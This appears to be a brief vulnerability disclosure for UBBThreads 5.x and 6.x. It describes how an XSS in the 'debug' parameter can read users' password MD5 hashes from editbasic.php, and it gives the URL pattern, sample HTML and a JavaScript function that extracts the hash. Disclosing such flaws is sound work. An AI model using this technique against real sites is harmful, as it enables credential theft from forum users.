UBBThreads 5.x,6.x md5 hash disclosure
-------------------------------------------
Using XSS such as the one reported earlier:

http://[site]/[ubbpath]/index.php?debug=[xss]

will allow you to inject javascript and steal MD5 Hashes from:

http://[site]/[ubbpath]/editbasic.php

The MD5 is automatically included in the source of the html for a logged on user, the field type is password so it appears as "******" - although the source contains the MD5.  Below is an example snippet of the html source:


<input type="password" name="ChosenPassword" value="81dc9bdb52d04dc20036dbd8313ed055" class="formboxes" />
<br />
<br />
Verify Password
<br />

<input type = "password" name = "Verify" value = "81dc9bdb52d04dc20036dbd8313ed055" class="formboxes" />

A malicious attacker could force a user to perform a GET request to the xss containing js to steal their hash.  

The below javascript would grab the MD5 using the XMLHttpRequest object.  str is defined as the ResponseText from XMLHttpRequest()

function findmd5(str){
	var s = str.indexOf('name="ChosenPassword" value="');
	var e = str.indexOf('" class=f', s);
	return str.substring(s+29, e);
}
